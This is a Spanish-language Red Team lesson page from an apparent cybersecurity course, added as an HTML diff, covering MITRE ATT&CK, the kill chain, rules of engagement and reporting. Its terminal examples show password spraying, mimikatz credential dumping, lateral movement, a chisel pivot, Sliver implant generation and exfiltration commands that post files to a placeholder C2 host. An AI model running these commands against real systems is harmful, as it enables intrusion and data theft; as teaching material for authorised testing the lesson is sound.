@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Lección 15: Red Team — Simulación de ataques reales con MITRE ATT&CK: kill chain, reconocimiento, explotación, pivoteo y persistencia.">
+    <title>Lección 15: Red Team — CyberPath 2026</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800;900&family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+        <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+    <link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+    <div class="bg-grid"></div><div class="bg-glow bg-glow-1"></div><div class="bg-glow bg-glow-2"></div>
+    <nav class="navbar" id="navbar"><a href="../index.html" class="nav-brand" style="text-decoration:none"><div class="brand-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="brand-text">Cyber<span class="accent">Path</span> 2026</span></a></nav>
+    <main class="lesson-page">
+        <div class="lesson-breadcrumb"><a href="../index.html">Inicio</a><span>›</span><span>Fase 3</span><span>›</span><span>Lección 15</span></div>
+        <div class="lesson-hero">
+            <div class="lesson-phase-badge" style="background:rgba(255,82,82,0.15);color:#ff5252">Fase 3 — Red Team y Técnicas Avanzadas</div>
+            <h1>Red Team — Simulación de ataques reales con MITRE ATT&CK</h1>
+            <p class="lesson-intro">
+                El <strong>Red Team</strong> simula ataques reales contra una organización para evaluar su capacidad de defensa.
+                No es solo "explotar una vulnerabilidad" — es un <strong>ejercicio completo</strong> que incluye 
+                reconocimiento, acceso inicial, movimiento lateral, persistencia y exfiltración.
+                En esta lección aprenderás a planificar y ejecutar una operación de Red Team usando el framework 
+                <strong>MITRE ATT&CK</strong>.
+            </p>
+        </div>
+        <div class="lesson-toc"><h3>📋 Contenido de esta lección</h3>
+            <ol>
+                <li><a href="#que-es-redteam">¿Qué es Red Team?</a></li>
+                <li><a href="#vs-pentest">Red Team vs Pentesting</a></li>
+                <li><a href="#mitre">MITRE ATT&CK: el mapa del atacante</a></li>
+                <li><a href="#kill-chain">Cyber Kill Chain</a></li>
+                <li><a href="#planificacion">Planificación de una operación</a></li>
+                <li><a href="#reconocimiento">Reconocimiento (OSINT)</a></li>
+                <li><a href="#acceso-inicial">Acceso inicial y ejecución</a></li>
+                <li><a href="#movimiento">Movimiento lateral y escalada</a></li>
+                <li><a href="#persistencia">Persistencia y evasión</a></li>
+                <li><a href="#exfiltracion">Exfiltración de datos</a></li>
+                <li><a href="#c2">Infraestructura C2</a></li>
+                <li><a href="#reporte">Reporte de Red Team</a></li>
+                <li><a href="#practica">Práctica</a></li>
+            </ol>
+        </div>
+
+        <div class="lesson-section" id="que-es-redteam"><h2><span class="section-icon">🎯</span> 1. ¿Qué es Red Team?</h2>
+            <p class="lesson-text">Un <strong>Red Team</strong> es un equipo que simula ser un adversario real (APT, cibercriminal, insider) para probar la seguridad de una organización de forma <strong>integral</strong>: tecnología, procesos y personas.</p>
+            <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Equipo</th><th>Rol</th><th>Objetivo</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>🔴 Red Team</strong></td><td>Atacante</td><td>Simular ataques reales, encontrar caminos de compromiso completo</td></tr>
+                    <tr><td><strong>🔵 Blue Team</strong></td><td>Defensor</td><td>Detectar, responder y contener los ataques del Red Team</td></tr>
+                    <tr><td><strong>🟣 Purple Team</strong></td><td>Colaboración</td><td>Red + Blue trabajan juntos para mejorar las defensas</td></tr>
+                    <tr><td><strong>⬜ White Team</strong></td><td>Árbitro</td><td>Supervisa el ejercicio, define las reglas de engagement</td></tr>
+                </tbody>
+            </table></div>
+        </div>
+
+        <div class="lesson-section" id="vs-pentest"><h2><span class="section-icon">⚔️</span> 2. Red Team vs Pentesting</h2>
+            <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Aspecto</th><th>Pentesting</th><th>Red Team</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Objetivo</strong></td><td>Encontrar vulnerabilidades técnicas</td><td>Probar la capacidad de detección y respuesta</td></tr>
+                    <tr><td><strong>Alcance</strong></td><td>Definido (app, red, servidor)</td><td>Amplio (toda la organización)</td></tr>
+                    <tr><td><strong>Duración</strong></td><td>1–4 semanas</td><td>2–6 meses</td></tr>
+                    <tr><td><strong>Sigilo</strong></td><td>No necesario</td><td>Esencial — evitar detección</td></tr>
+                    <tr><td><strong>Técnicas</strong></td><td>Técnicas (exploits, misconfig)</td><td>Técnicas + phishing + físicas + social engineering</td></tr>
+                    <tr><td><strong>Blue Team sabe</strong></td><td>Sí, es coordinado</td><td>No — el ejercicio es sorpresa</td></tr>
+                    <tr><td><strong>Entregable</strong></td><td>Lista de vulnerabilidades + CVSS</td><td>Narrativa de ataque completa + mejoras de detección</td></tr>
+                </tbody>
+            </table></div>
+        </div>
+
+        <div class="lesson-section" id="mitre"><h2><span class="section-icon">🗺️</span> 3. MITRE ATT&CK: el mapa del atacante</h2>
+            <p class="lesson-text"><strong>MITRE ATT&CK</strong> es una base de conocimiento que categoriza las tácticas y técnicas que usan los adversarios reales. Es tu guía para planificar operaciones de Red Team.</p>
+            <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Táctica</th><th>Pregunta que responde</th><th>Ejemplo de técnica</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Reconnaissance</strong></td><td>¿Cómo recopilo información?</td><td>T1593: Buscar en sitios web públicos</td></tr>
+                    <tr><td><strong>Resource Development</strong></td><td>¿Cómo preparo mi infraestructura?</td><td>T1583: Comprar dominios para phishing</td></tr>
+                    <tr><td><strong>Initial Access</strong></td><td>¿Cómo entro a la red?</td><td>T1566: Phishing con adjunto malicioso</td></tr>
+                    <tr><td><strong>Execution</strong></td><td>¿Cómo ejecuto mi código?</td><td>T1059: PowerShell, Python, Bash</td></tr>
+                    <tr><td><strong>Persistence</strong></td><td>¿Cómo mantengo el acceso?</td><td>T1053: Tareas programadas</td></tr>
+                    <tr><td><strong>Privilege Escalation</strong></td><td>¿Cómo obtengo más permisos?</td><td>T1068: Explotar vulnerabilidad del kernel</td></tr>
+                    <tr><td><strong>Defense Evasion</strong></td><td>¿Cómo evito ser detectado?</td><td>T1027: Ofuscar archivos/información</td></tr>
+                    <tr><td><strong>Credential Access</strong></td><td>¿Cómo obtengo credenciales?</td><td>T1003: Dump de credenciales (mimikatz)</td></tr>
+                    <tr><td><strong>Discovery</strong></td><td>¿Qué hay en la red?</td><td>T1018: Descubrimiento de sistemas remotos</td></tr>
+                    <tr><td><strong>Lateral Movement</strong></td><td>¿Cómo me muevo a otras máquinas?</td><td>T1021: RDP, SMB, WinRM</td></tr>
+                    <tr><td><strong>Collection</strong></td><td>¿Qué datos recojo?</td><td>T1005: Datos de sistemas locales</td></tr>
+                    <tr><td><strong>Exfiltration</strong></td><td>¿Cómo saco los datos?</td><td>T1048: Exfiltración por protocolo alternativo</td></tr>
+                    <tr><td><strong>Impact</strong></td><td>¿Qué daño puedo causar?</td><td>T1486: Ransomware (cifrar datos)</td></tr>
+                </tbody>
+            </table></div>
+        </div>
+
+        <div class="lesson-section" id="kill-chain"><h2><span class="section-icon">⛓️</span> 4. Cyber Kill Chain</h2>
+            <div class="lesson-diagram"><pre>
+    Cyber Kill Chain (Lockheed Martin):
+    
+    1. Reconocimiento    → Investigar el objetivo (OSINT, escaneo)
+    2. Armamento         → Crear el payload/exploit
+    3. Entrega           → Enviar el ataque (email, web, USB)
+    4. Explotación       → Explotar la vulnerabilidad
+    5. Instalación       → Instalar backdoor/C2
+    6. Comando y Control → Establecer comunicación con el C2
+    7. Acciones sobre    → Exfiltrar datos, ransomware, destrucción
+       objetivos
+            </pre><p class="diagram-caption">Cada eslabón roto detiene el ataque — la defensa en profundidad funciona</p></div>
+        </div>
+
+        <div class="lesson-section" id="planificacion"><h2><span class="section-icon">📋</span> 5. Planificación de una operación</h2>
+            <p class="lesson-text">Antes de cualquier ataque, necesitas un <strong>Rules of Engagement (RoE)</strong> firmado:</p>
+            <div class="lesson-callout"><strong>📌 Elementos del RoE:</strong>
+                <ul>
+                    <li><strong>Alcance</strong>: ¿Qué sistemas, redes y personas están incluidas?</li>
+                    <li><strong>Exclusiones</strong>: ¿Qué NO se puede atacar? (sistemas críticos de producción)</li>
+                    <li><strong>Técnicas permitidas</strong>: ¿Se permite phishing? ¿Acceso físico? ¿Ingeniería social?</li>
+                    <li><strong>Contacto de emergencia</strong>: ¿A quién llamas si algo sale mal?</li>
+                    <li><strong>Ventana temporal</strong>: ¿Cuándo se ejecuta el ejercicio?</li>
+                    <li><strong>Objetivos específicos</strong>: "Obtener acceso a la base de datos de clientes"</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="reconocimiento"><h2><span class="section-icon">🔍</span> 6. Reconocimiento (OSINT)</h2>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">OSINT</span></div>
+                <pre><code><span style="color:#546e7a"># Reconocimiento pasivo de dominios</span>
+<span style="color:#00e676">$</span> amass enum -passive -d empresa.com
+<span style="color:#00e676">$</span> subfinder -d empresa.com
+<span style="color:#00e676">$</span> theHarvester -d empresa.com -b all
+
+<span style="color:#546e7a"># Buscar emails y credenciales filtradas</span>
+<span style="color:#00e676">$</span> h8mail -t "@empresa.com"
+
+<span style="color:#546e7a"># Reconocimiento de infraestructura</span>
+<span style="color:#00e676">$</span> shodan search "empresa.com"
+<span style="color:#00e676">$</span> censys search "empresa.com"
+
+<span style="color:#546e7a"># Buscar archivos sensibles</span>
+<span style="color:#546e7a"># Google Dorks:</span>
+<span style="color:#546e7a"># site:empresa.com filetype:pdf</span>
+<span style="color:#546e7a"># site:empresa.com intitle:"index of"</span>
+<span style="color:#546e7a"># site:empresa.com inurl:admin</span></code></pre>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="acceso-inicial"><h2><span class="section-icon">🚪</span> 7. Acceso inicial y ejecución</h2>
+            <p class="lesson-text">Las técnicas más comunes de acceso inicial en Red Team:</p>
+            <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Técnica</th><th>Descripción</th><th>Herramientas</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Spear Phishing</strong></td><td>Emails personalizados con adjuntos o links maliciosos</td><td><code>GoPhish</code>, <code>Evilginx2</code></td></tr>
+                    <tr><td><strong>Explotación web</strong></td><td>Vulnerabilidades en apps web expuestas</td><td><code>Burp Suite</code>, <code>SQLMap</code></td></tr>
+                    <tr><td><strong>Password Spraying</strong></td><td>Probar contraseñas comunes contra muchos usuarios</td><td><code>CrackMapExec</code>, <code>Spray</code></td></tr>
+                    <tr><td><strong>VPN/RDP expuesto</strong></td><td>Credenciales filtradas o débiles en servicios remotos</td><td><code>Hydra</code>, <code>Crowbar</code></td></tr>
+                </tbody>
+            </table></div>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Password Spraying</span></div>
+                <pre><code><span style="color:#546e7a"># Probar "Company2026!" contra todos los usuarios del dominio</span>
+<span style="color:#00e676">$</span> crackmapexec smb DC_IP -u usuarios.txt -p 'Company2026!' --continue-on-success
+
+<span style="color:#546e7a"># Si un usuario acierta:</span>
+<span style="color:#ffcc02">SMB  10.10.10.1  445  DC01  [+] empresa.local\jgarcia:Company2026!</span></code></pre>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="movimiento"><h2><span class="section-icon">🏃</span> 8. Movimiento lateral y escalada</h2>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Movimiento lateral</span></div>
+                <pre><code><span style="color:#546e7a"># Moverse a otra máquina via WinRM</span>
+<span style="color:#00e676">$</span> evil-winrm -i 10.10.10.5 -u admin -p 'Password123'
+
+<span style="color:#546e7a"># Via SMB con PsExec</span>
+<span style="color:#00e676">$</span> impacket-psexec empresa.local/admin:pass@10.10.10.5
+
+<span style="color:#546e7a"># Dump de credenciales con Mimikatz (en Windows)</span>
+<span style="color:#00e676">mimikatz#</span> sekurlsa::logonpasswords
+
+<span style="color:#546e7a"># Pivoteo: usar una máquina comprometida como puente</span>
+<span style="color:#00e676">$</span> chisel server -p 8080 --reverse  <span style="color:#546e7a"># En tu máquina</span>
+<span style="color:#00e676">$</span> chisel client TUIP:8080 R:socks  <span style="color:#546e7a"># En la víctima</span>
+<span style="color:#546e7a"># Ahora tienes un proxy SOCKS para pivotar</span></code></pre>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="persistencia"><h2><span class="section-icon">🔗</span> 9. Persistencia y evasión</h2>
+            <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Técnica de persistencia</th><th>Descripción</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Scheduled Tasks</strong></td><td>Crear tarea programada que ejecute tu beacon</td></tr>
+                    <tr><td><strong>Registry Run Keys</strong></td><td>Agregar ejecutable al autostart de Windows</td></tr>
+                    <tr><td><strong>WMI Event Subscription</strong></td><td>Evento WMI que ejecuta código ante un trigger</td></tr>
+                    <tr><td><strong>Golden Ticket</strong></td><td>Ticket Kerberos forjado que nunca expira</td></tr>
+                    <tr><td><strong>SSH Keys</strong></td><td>Agregar tu clave SSH al authorized_keys (Linux)</td></tr>
+                    <tr><td><strong>Webshell</strong></td><td>Shell en el servidor web (PHP, ASPX)</td></tr>
+                </tbody>
+            </table></div>
+            <div class="lesson-callout"><strong>🕵️ Técnicas de evasión:</strong>
+                <ul>
+                    <li><strong>AMSI Bypass</strong>: Deshabilitar el Antimalware Scan Interface de Windows</li>
+                    <li><strong>Obfuscation</strong>: Ofuscar payloads con herramientas como <code>ScareCrow</code></li>
+                    <li><strong>Living off the Land (LOLBins)</strong>: Usar binarios legítimos de Windows (certutil, mshta, regsvr32)</li>
+                    <li><strong>Timestomping</strong>: Modificar marcas de tiempo de archivos</li>
+                    <li><strong>Process Injection</strong>: Inyectar código en procesos legítimos</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="exfiltracion"><h2><span class="section-icon">📤</span> 10. Exfiltración de datos</h2>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Exfiltración</span></div>
+                <pre><code><span style="color:#546e7a"># Exfiltración por DNS (difícil de detectar)</span>
+<span style="color:#00e676">$</span> dnscat2 --dns server=tudominio.com
+
+<span style="color:#546e7a"># Exfiltración por HTTPS (se mezcla con tráfico normal)</span>
+<span style="color:#00e676">$</span> curl -X POST -d @datos_sensibles.zip https://tu-c2.com/upload
+
+<span style="color:#546e7a"># Exfiltración por ICMP</span>
+<span style="color:#00e676">$</span> python3 icmpexfil.py --file datos.zip --dest TU_IP</code></pre>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="c2"><h2><span class="section-icon">🖥️</span> 11. Infraestructura C2</h2>
+            <p class="lesson-text">Un <strong>Command & Control (C2)</strong> es el servidor desde el cual controlas los sistemas comprometidos.</p>
+            <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Framework C2</th><th>Tipo</th><th>Características</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Sliver</strong></td><td>Open Source</td><td>Moderno, multi-plataforma, soporte DNS/HTTP/mTLS. Recomendado para aprender.</td></tr>
+                    <tr><td><strong>Cobalt Strike</strong></td><td>Comercial</td><td>El estándar de la industria. Beacon, Malleable C2, BOFs.</td></tr>
+                    <tr><td><strong>Havoc</strong></td><td>Open Source</td><td>Alternativa moderna a Cobalt Strike con GUI.</td></tr>
+                    <tr><td><strong>Mythic</strong></td><td>Open Source</td><td>Framework modular con múltiples agentes y perfiles C2.</td></tr>
+                </tbody>
+            </table></div>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Sliver C2 básico</span></div>
+                <pre><code><span style="color:#546e7a"># Instalar Sliver</span>
+<span style="color:#00e676">$</span> curl https://sliver.sh/install | sudo bash
+
+<span style="color:#546e7a"># Iniciar Sliver</span>
+<span style="color:#00e676">$</span> sliver
+
+<span style="color:#546e7a"># Generar un implante (beacon)</span>
+<span style="color:#00e676">sliver ></span> generate --http tu-c2.com --os windows --arch amd64 --save implant.exe
+
+<span style="color:#546e7a"># Iniciar listener HTTP</span>
+<span style="color:#00e676">sliver ></span> http
+
+<span style="color:#546e7a"># Cuando la víctima ejecute implant.exe, verás:</span>
+<span style="color:#ffcc02">[*] Session opened: RANDOM_NAME - 10.10.10.5:49832</span></code></pre>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="reporte"><h2><span class="section-icon">📝</span> 12. Reporte de Red Team</h2>
+            <div class="lesson-callout"><strong>📌 Estructura del reporte:</strong>
+                <ol>
+                    <li><strong>Resumen ejecutivo</strong>: Para directivos. ¿Se logró el objetivo? ¿Cuál es el riesgo real?</li>
+                    <li><strong>Narrativa del ataque</strong>: Historia completa paso a paso, con timeline</li>
+                    <li><strong>Técnicas MITRE ATT&CK usadas</strong>: Mapear cada acción a una técnica</li>
+                    <li><strong>Evidencias</strong>: Screenshots, logs, artefactos capturados</li>
+                    <li><strong>Detección del Blue Team</strong>: ¿Qué detectaron? ¿Qué NO detectaron?</li>
+                    <li><strong>Recomendaciones</strong>: Mejoras de detección, prevención y respuesta</li>
+                </ol>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="practica"><h2><span class="section-icon">🏋️</span> 13. Práctica</h2>
+            <div class="practice-box"><h4>✅ ¿Completaste esta lección?</h4>
+                <ul>
+                    <li>Entiendes la diferencia entre Red Team y Pentesting</li>
+                    <li>Conoces las 14 tácticas de MITRE ATT&CK</li>
+                    <li>Puedes explicar la Cyber Kill Chain</li>
+                    <li>Sabes qué incluir en un Rules of Engagement</li>
+                    <li>Conoces técnicas de acceso inicial, movimiento lateral y persistencia</li>
+                    <li>Entiendes qué es un C2 y cómo funciona Sliver</li>
+                    <li>Sabes cómo estructurar un reporte de Red Team</li>
+                </ul>
+            </div>
+        
+            <div class="external-labs">
+                <h4>🔗 Practica en plataformas reales</h4>
+                <ul>
+                    <li><a href="https://tryhackme.com/room/redteamfundamentals" target="_blank" rel="noopener noreferrer">TryHackMe: Red Team Fundamentals</a><span class="lab-tag lab-tag-free">Gratis</span></li>
+                    <li><a href="https://tryhackme.com/room/mitre" target="_blank" rel="noopener noreferrer">TryHackMe: MITRE</a><span class="lab-tag lab-tag-free">Gratis</span></li>
+                    <li><a href="https://tryhackme.com/room/redteamrecon" target="_blank" rel="noopener noreferrer">TryHackMe: Red Team Recon</a><span class="lab-tag lab-tag-free">Gratis</span></li>
+                </ul>
+            </div>
+
+            <div class="quiz-box" id="quiz-container"></div>
+        </div>
+
+        <div class="lesson-nav">
+            <a href="leccion-14-wifi-hacking.html"><span class="nav-label">← Anterior</span><span class="nav-title">Lección 14: Hacking WiFi</span></a>
+            <a href="leccion-15b-cloud-security.html" class="next"><span class="nav-label">Siguiente →</span><span class="nav-title">Lección 15B: Cloud Security 101</span></a>
+        </div>
+    </main>
+    <footer class="footer"><div class="container"><div class="footer-content"><p style="color:var(--text-muted);font-size:0.85rem;text-align:center">CyberPath 2026 — Curso Completo de Ciberseguridad</p></div></div></footer>
+
+    <script src="../quiz.js"></script>
+    <script>
+        const quizQuestions = [
+          {
+                    "question": "¿Cuál es la diferencia principal entre un pentest y un ejercicio de Red Team?",
+                    "options": [
+                              "No hay diferencia, son lo mismo",
+                              "Un pentest busca vulnerabilidades en un alcance definido; Red Team simula un ataque real completo contra toda la organización",
+                              "Red Team solo hace ingeniería social",
+                              "Un pentest es más avanzado que Red Team"
+                    ],
+                    "correct": 1
+          },
+          {
+                    "question": "¿Qué es MITRE ATT&CK?",
+                    "options": [
+                              "Una herramienta de hacking como Metasploit",
+                              "Una base de conocimiento que documenta tácticas, técnicas y procedimientos (TTPs) de atacantes reales",
+                              "Un sistema operativo para pentesting",
+                              "Una certificación de seguridad"
+                    ],
+                    "correct": 1
+          },
+          {
+                    "question": "¿Qué es 'pivoting' en el contexto de Red Team?",
+                    "options": [
+                              "Cambiar de herramienta de ataque",
+                              "Usar una máquina comprometida como punto de salto para atacar otros sistemas en la red interna",
+                              "Rotar entre diferentes objetivos",
+                              "Cambiar la dirección IP de ataque"
+                    ],
+                    "correct": 1
+          }
+];
+        window._quizQuestions = window._quizQuestions || {};
+        window._quizQuestions['leccion-15'] = quizQuestions;
+        document.addEventListener('DOMContentLoaded', () => {
+            CyberQuiz.init('leccion-15', quizQuestions);
+            const explanations = [
+                "Un pentest tiene alcance limitado (ej: 'prueba esta app web'). Red Team simula un adversario real: reconocimiento, acceso inicial, movimiento lateral, persistencia y exfiltración — sin límites artificiales.",
+                "MITRE ATT&CK cataloga TTPs de atacantes reales organizados en tácticas (por qué) y técnicas (cómo). Es el estándar para describir comportamiento adversarial.",
+                "Pivoting usa una máquina comprometida como proxy para alcanzar redes internas que no son accesibles directamente. Es esencial para movimiento lateral en redes corporativas segmentadas."
+            ];
+            document.querySelectorAll('.quiz-question').forEach((q, i) => {
+                if (explanations[i]) q.dataset.explanation = explanations[i];
+            });
+        });
+    </script>
+</body></html>
